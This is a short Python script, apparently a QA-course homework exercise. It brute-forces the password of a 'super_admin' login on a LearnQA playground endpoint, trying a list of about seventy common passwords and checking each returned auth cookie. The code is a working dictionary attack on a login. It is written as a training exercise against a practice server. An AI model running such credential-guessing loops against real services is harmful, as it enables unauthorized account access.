import json
from json.decoder import JSONDecodeError
import requests

password_lst = ["password", "123456", "12345678", "12345", "123456789", "qwerty", "abc123", "football", "1234567", "monkey",
                "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess",
                "adobe123", "123123", "welcome", "login", "admin", "solo", "1q2w3e4r", "master", "666666",
                "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey",
                "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*", "jesus",
                "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456",
                "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000",
                "123qwe", "qwerty123"]

i = 0

for i in range(len(password_lst)):
    payload = {
        "login": "super_admin",
        "password": password_lst[i]
    }
    response_check_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                        data=payload)
    try:
        parsed_response = json.loads(response_check_pass.text)
        auth_cookie = parsed_response["auth_cookie"]
        response_check_cookie = requests.get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                             cookies={"auth_cookie": auth_cookie})
        if response_check_cookie.text == "You are authorized":
            print(response_check_cookie.text)
            print(password_lst[i])
        else:
            i += 1
    except JSONDecodeError:
        print("ERROR")


